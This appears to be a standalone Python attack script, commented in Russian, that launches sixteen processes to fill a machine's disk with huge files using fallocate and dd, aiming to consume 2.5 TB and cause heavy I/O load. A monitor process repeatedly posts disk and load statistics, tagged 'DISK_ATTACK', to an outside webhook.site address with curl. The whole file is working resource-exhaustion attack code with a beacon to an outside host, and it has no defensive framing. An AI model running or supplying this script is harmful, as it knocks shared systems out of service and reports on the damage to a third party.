import os
import subprocess
import time
from multiprocessing import Process

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"

def fast_fill(worker_id):
    """Каждый воркер пытается откусить по 100 ГБ за раз"""
    path = f"/tmp/heavy_payload_{worker_id}"
    if not os.path.exists(path):
        os.makedirs(path)
        
    i = 0
    while True:
        file_name = f"{path}/blob_{i}.bin"
        try:
            # Резервируем 50 ГБ мгновенно
            subprocess.run(['fallocate', '-l', '50G', file_name], check=True)
            i += 1
        except:
            # Если fallocate не поддерживается файловой системой overlay, 
            # переходим на быстрый dd
            subprocess.run(['dd', 'if=/dev/zero', f'of={file_name}', 'bs=1G', 'count=10'], stderr=subprocess.DEVNULL)
            break

def monitor():
    """Маяк на вебхук"""
    while True:
        # Собираем инфу о диске
        df = subprocess.check_output(['df', '-h', '/']).decode('utf-8')
        # Собираем инфу о нагрузке (LOAD)
        load = os.getloadavg()
        
        payload = {
            "MSG": "DISK_ATTACK",
            "DF": df.split('\n')[1], # Берем только строку с данными
            "LOAD": load
        }
        
        try:
            subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
                           '-d', str(payload), WEBHOOK_URL])
        except:
            pass
        time.sleep(60)

if __name__ == "__main__":
    # 1. Запускаем мониторинг
    Process(target=monitor, daemon=True).start()

    # 2. Запускаем 16 параллельных потоков на запись
    # Это создаст дикую нагрузку на I/O (Disk Wait)
    print(f"[*] Starting 16 workers to eat 2.5TB...")
    workers = []
    for i in range(16):
        p = Process(target=fast_fill, args=(i,))
        p.start()
        workers.append(p)

    for p in workers:
        p.join()
